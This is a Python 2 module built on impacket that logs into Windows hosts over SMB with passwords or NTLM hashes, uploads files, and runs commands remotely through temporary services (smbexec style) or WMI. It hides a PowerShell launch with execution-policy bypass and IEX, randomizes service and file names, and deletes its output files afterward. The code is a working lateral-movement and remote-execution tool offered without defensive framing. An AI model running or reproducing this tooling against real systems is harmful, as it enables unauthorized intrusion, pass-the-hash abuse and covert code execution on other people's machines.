#!/usr/bin/env python2
from impacket import smbserver, ntlm
from impacket.dcerpc.v5 import transport, scmr
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.smbconnection import *
import argparse
import time
import ConfigParser
import traceback
import random
import sys
import os
import string
import encodings

PERM_DIR = ''.join(random.sample(string.ascii_letters, 10))
BATCH_FILENAME  = ''.join(random.sample(string.ascii_letters, 10)) + '.bat'
SMBSERVER_DIR   = ''.join(random.sample(string.ascii_letters, 10))
DUMMY_SHARE     = 'TMP'

if not 'idna' in encodings._cache or not encodings._cache['idna']:
    import encodings.idna
    encodings._cache['idna'] = encodings.idna.getregentry()

class FileTransfer(object):
    def __init__(self, host, port=445, hash='', username='', password='', domain='', timeout=30):
        self.__host = host
        self.__nthash, self.__lmhash = '', ''
        if hash and ':' in hash:
            self.__lmhash, self.__nthash = hash.strip().split(':')
        self.__port = port
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__timeout = timeout
        self.__exception = None

        try:
            self.__conn = SMBConnection(
                self.__host, self.__host,
                None,
                self.__port, timeout=self.__timeout
            )

            self.__conn.login(
                self.__username,
                self.__password,
                self.__domain,
                self.__lmhash,
                self.__nthash
            )

        except Exception, e:
            self.__exception = e

    @property
    def error(self):
        return str(self.__exception)

    @property
    def ok(self):
        return self.__exception is None

    def shares(self):
        try:
            return [
                x['shi1_netname'][:-1] for x in self.__conn.listShares()
            ]
        except Exception, e:
            self.__exception = e
            return []

    def ls(self, share, path):
        try:
            listing = []
            for f in self.__conn.listPath(share, path):
                if f.get_longname() in ('.', '..'):
                    continue

                listing.append((
                    f.get_longname(), f.is_directory() > 0,
                    f.get_filesize(), time.ctime(float(f.get_mtime_epoch()))
                ))
            return listing

        except Exception, e:
            self.__exception = e
            return []

    def rm(self, share, path):
        try:
            self.__conn.deleteFile(share, path)
        except Exception, e:
            self.__exception = e

    def mkdir(self, share, path):
        try:
            self.__conn.createDirectory(share, path)
        except Exception, e:
            self.__exception = e

    def rmdir(self, share, path):
        try:
            self.__conn.deleteDirectory(share, path)
        except Exception, e:
            self.__exception = e

    def get(self, share, remote, local):
        if not self.ok:
            raise ValueError('Connection was not established')

        try:
            if type(local) in (str, unicode):
                local = os.path.expandvars(local)
                local = os.path.expanduser(local)

                with open(local, 'w+b') as destination:
                    self.__conn.getFile(
                        share,
                        remote,
                        destination.write
                    )
            else:
                self.__conn.getFile(share, remote, local)

        except Exception, e:
            self.__exception = e

    def put(self, local, share, remote):
        if not self.ok:
            raise ValueError('Connection was not established')

        try:
            if type(local) in (str, unicode):
                local = os.path.expandvars(local)
                local = os.path.expanduser(local)

                if not os.path.exists(local):
                    raise ValueError('Local file ({}) does not exists'.format(local))

                with open(local, 'rb') as source:
                    self.__conn.putFile(
                        share,
                        remote,
                        source.read
                    )
            else:
                self.__conn.putFile(share, remote, local)

        except Exception, e:
            self.__exception = e

    def __del__(self):
        if self.__conn:
            try:
                self.__conn.logoff()
            except:
                pass


class RemoteShellsmbexec(object):
    def __init__(self, share, rpc, mode, serviceName, command, timeout):
        self.__share = share
        self.__mode = mode
        self.__output_filename = ''.join(random.sample(string.ascii_letters, 10))
        self.__output = '\\Windows\\Temp\\' + self.__output_filename
        self.__batchFile = '%TEMP%\\' + BATCH_FILENAME
        self.__outputBuffer = ''
        self.__command = command
        self.__shell = '%COMSPEC% /Q /c '
        self.__serviceName = serviceName
        self.__rpc = rpc
        self.__scmr = rpc.get_dce_rpc()
        self.__timeout = timeout

        try:
            self.__scmr.connect()
        except Exception as e:
            print "[!] {}".format(e)
            raise

        s = rpc.get_smb_connection()

        s.setTimeout(self.__timeout)
        if mode == 'SERVER':
            myIPaddr = s.getSMBServer().get_socket().getsockname()[0]
            self.__copyBack = 'copy %s \\\\%s\\%s' % (self.__output, myIPaddr, DUMMY_SHARE)

        try:
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
            self.transferClient = rpc.get_smb_connection()
        except Exception as e:
            print "[-] {}".format(e)

    def finish(self):
        # Just in case the service is still created
        try:
           self.__scmr = self.__rpc.get_dce_rpc()
           self.__scmr.connect()
           self.__scmr.bind(svcctl.MSRPC_UUID_SVCCTL)
           resp = scmr.hROpenSCManagerW(self.__scmr)
           self.__scHandle = resp['lpScHandle']
           resp = scmr.hROpenServiceW(self.__scmr, self.__scHandle, self.__serviceName)
           service = resp['lpServiceHandle']
           scmr.hRDeleteService(self.__scmr, service)
           scmr.hRControlService(self.__scmr, service, scmr.SERVICE_CONTROL_STOP)
           scmr.hRCloseServiceHandle(self.__scmr, service)
        except Exception, e:
           pass

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__mode == 'SHARE':
            self.transferClient.getFile(self.__share, self.__output, output_callback)
            self.transferClient.deleteFile(self.__share, self.__output)

        else:
            fd = open(SMBSERVER_DIR + '/' + self.__output_filename, 'r')
            output_callback(fd.read())
            fd.close()
            os.unlink(SMBSERVER_DIR + '/' + self.__output_filename)

    def execute_remote(self, data, nooutput=False):
        if nooutput:
            command = data
        else:
            command = self.__shell + 'echo ' + data + ' ^> ' + self.__output + ' 2^>^&1 > ' + self.__batchFile + ' & ' + self.__shell + self.__batchFile
            if self.__mode == 'SERVER':
                command += ' & ' + self.__copyBack
            command += ' & ' + 'del ' + self.__batchFile

        try:
            resp = scmr.hRCreateServiceW(self.__scmr, self.__scHandle, self.__serviceName, self.__serviceName, lpBinaryPathName=command)
            service = resp['lpServiceHandle']
        except:
            return

        try:
           scmr.hRStartServiceW(self.__scmr, service)
        except:
           pass

        scmr.hRDeleteService(self.__scmr, service)
        scmr.hRCloseServiceHandle(self.__scmr, service)

        if not nooutput:
            self.get_output()

    def send_data(self, data, nooutput=False):
        self.execute_remote(data, nooutput=nooutput)
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result

class CMDEXEC(object):
    KNOWN_PROTOCOLS = {
        '139/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 139),
        '445/SMB': (r'ncacn_np:%s[\pipe\svcctl]', 445),
    }

    def __init__(self, protocols=None,  username='', password='',
                     domain='', hashes='', share=None, command=None, timeout=30):

        if not protocols:
            protocols = CMDEXEC.KNOWN_PROTOCOLS.keys()

        self.__username = username
        self.__password = password
        self.__protocols = [protocols]
        self.__serviceName = self.service_generator()
        self.__domain = domain
        self.__command = command
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__doKerberos = None
        self.__share = share
        self.__mode  = 'SHARE'
        self.__timeout = timeout

        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def service_generator(self, size=6, chars=string.ascii_uppercase):
        return ''.join(random.choice(chars) for _ in range(size))

    def run(self, addr, nooutput):
        result = ''
        for protocol in self.__protocols:
            protodef = CMDEXEC.KNOWN_PROTOCOLS[protocol]
            port = protodef[1]

            stringbinding = protodef[0] % addr
            rpctransport = transport.DCERPCTransportFactory(stringbinding)
            rpctransport.set_dport(port)

            if hasattr(rpctransport,'preferred_dialect'):
               rpctransport.preferred_dialect(SMB_DIALECT)

            if hasattr(rpctransport, 'set_credentials'):
                # This method exists only for selected protocol sequences.
                rpctransport.set_credentials(
                    self.__username, self.__password,
                    self.__domain, self.__lmhash,
                    self.__nthash, self.__aesKey
                )

            try:
                self.shell = RemoteShellsmbexec(
                    self.__share, rpctransport, self.__mode, self.__serviceName,
                    self.__command, self.__timeout
                )
                result = self.shell.send_data(self.__command, nooutput=nooutput)

            except SessionError as e:
                if 'STATUS_SHARING_VIOLATION' in str(e):
                    return
                else:
                    print "[-] {}".format(e)

            except  (Exception, KeyboardInterrupt), e:
                print e
                traceback.print_exc()
                self.shell.finish()
                sys.stdout.flush()

        return result

class WMIEXEC:
    def __init__(self, command='', username='', password='', domain='', hashes='', share=None, noOutput=True):
        self.__command = command
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = None
        self.__share = share
        self.__noOutput = noOutput
        self.__doKerberos = False
        if hashes:
            self.__lmhash, self.__nthash = hashes.split(':')

    def run(self, addr, smbConnection, nooutput):
        result = ''
        dcom = DCOMConnection(addr, self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash, self.__aesKey, oxidResolver = True, doKerberos=self.__doKerberos)
        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login,wmi.IID_IWbemLevel1Login)
        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
        iWbemServices= iWbemLevel1Login.NTLMLogin('//./root/cimv2', NULL, NULL)
        iWbemLevel1Login.RemRelease()

        win32Process,_ = iWbemServices.GetObject('Win32_Process')

        try:
            self.shell = RemoteShellwmi(self.__share, win32Process, smbConnection)
            result = self.shell.send_data(self.__command, nooutput=nooutput)
        except  (Exception, KeyboardInterrupt), e:
            traceback.print_exc()
            dcom.disconnect()
            sys.stdout.flush()

        dcom.disconnect()

        return result

class RemoteShellwmi():
    def __init__(self, share, win32Process, smbConnection, timeout=10):
        self.__share = share
        self.__output_filename = ''.join(random.sample(string.ascii_letters, 10))
        self.__output = '\\' + self.__output_filename
        self.__outputBuffer = ''
        self.__shell = 'cmd.exe /Q /c '
        self.__win32Process = win32Process
        self.__transferClient = smbConnection
        self.__pwd = 'C:\\'
        self.__noOutput = False
        self.__timeout = timeout

        # We don't wanna deal with timeouts from now on.
        if self.__transferClient is not None:
            self.__transferClient.setTimeout(self.__timeout)
        else:
            self.__noOutput = True

    def get_output(self):
        def output_callback(data):
            self.__outputBuffer += data

        if self.__noOutput is True:
            self.__outputBuffer = ''
            return

        timeout = self.__timeout

        while timeout:
            try:
                self.__transferClient.getFile(self.__share, self.__output, output_callback)
                break
            except Exception, e:
                time.sleep(1)
                timeout -= 1

        self.__transferClient.deleteFile(self.__share, self.__output)

    def execute_remote(self, data):
        if self.__noOutput is False:
            command = self.__shell + data
            command += ' 1> ' + '\\\\127.0.0.1\\%s' % self.__share + self.__output  + ' 2>&1'
        else:
            command = data

        obj = self.__win32Process.Create(command, self.__pwd, None)
        self.get_output()

    def send_data(self, data, nooutput=False):
        self.__noOutput = nooutput
        self.execute_remote(data)
        result = self.__outputBuffer
        self.__outputBuffer = ''
        return result

def fix_upload_path(dst):
    dst = string.replace(dst, '/', '\\')
    dst = os.path.normpath(dst)
    dst = dst.split('\\')
    dst = '\\' + '\\'.join(dst[1:])
    return os.path.normpath(dst)

def upload_file(smbconn, host, src, share, dst):
    if os.path.exists(src):
        print '[+] Starting upload: %s -> %s: %s  (%s bytes)' % (src, share, dst, os.path.getsize(src))
        upFile = open(src, 'rb')
        try:
            smbconn.putFile(share, dst, upFile.read)
            print '[+] Upload completed'
            upFile.close()
            return True
        except Exception as e:
            print '[!]', e
            print '[!] Error uploading file, you need to include destination file name in the path'
            upFile.close()
    else:
        print '[!] Invalid source. File does not exist'

    return False

def connect(host, port, user, passwd, hash, share, file_to_upload,
                src_folder, dst_folder, command,
                domain='workgroup', execm='smbexec', codepage='cp437', timeout=30, nooutput=False):
    try:
        lmhash = ''
        nthash = ''
        if hash:
            if not ':' in hash:
                print '[!] Invalid hash format: LM:NT'
                return

            lmhash, nthash = hash.split(':')

        login_ok = False

        print '[+] psexec: {}:{} ({})'.format(host, port, command)
        smb = SMBConnection(host, host, None, port, timeout=timeout)
        try:
            smb.login(user, passwd, domain, lmhash, nthash)
            login_ok = True
        except SessionError as e:
            if 'STATUS_ACCESS_DENIED' in e.message:
                pass
        except Exception, e:
            print "[!] {}".format(e)
            return

        print "[+] {}:{} is running {} (name:{}) (domain:{})".format(
            host, port, smb.getServerOS(), smb.getServerName(), domain)

        if not login_ok:
            print "[!] Login failed"
            return

        if file_to_upload and not command:
            # execute exe file
            if len(file_to_upload) == 1:
                command = fix_upload_path(os.path.join(dst_folder, file_to_upload[0]))

            # execute ps1 file
            else:
                command = 'powershell.exe -ExecutionPolicy Bypass -windowstyle hidden /c "cat %s | Out-String | IEX"' % (dst_folder + file_to_upload[0])

        if command:
            try:
                if file_to_upload:
                    for file in file_to_upload:
                        src_file = os.path.join(src_folder, file)
                        dst_file = fix_upload_path(os.path.join(dst_folder, file))
                        upload_file(smb, host, src_file, share, dst_file)

                if command:
                    print "Execute: {}".format(command)

                    if execm == 'smbexec':
                        executer = CMDEXEC(
                            '{}/SMB'.format(port), user, passwd,
                            domain, hash, share, command, timeout
                        )
                        result = executer.run(host, nooutput)

                    elif execm == 'wmi':
                        executer = WMIEXEC(command, user, passwd, domain, hash, share)
                        result = executer.run(host, smb, nooutput)

                    if result:
                        print result.decode(codepage)

                smb.logoff()

            except SessionError as e:
                print "[-] {}:{} {}".format(host, port, e)
            except Exception as e:
                print "[-] {}:{} {}".format(host, port, e)

    except Exception, e:
        print "[!] {}".format(e)
